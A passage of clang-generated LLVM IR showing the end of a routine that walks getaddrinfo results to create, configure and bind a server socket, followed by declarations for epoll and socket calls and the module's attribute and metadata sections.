  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.39, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !18

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
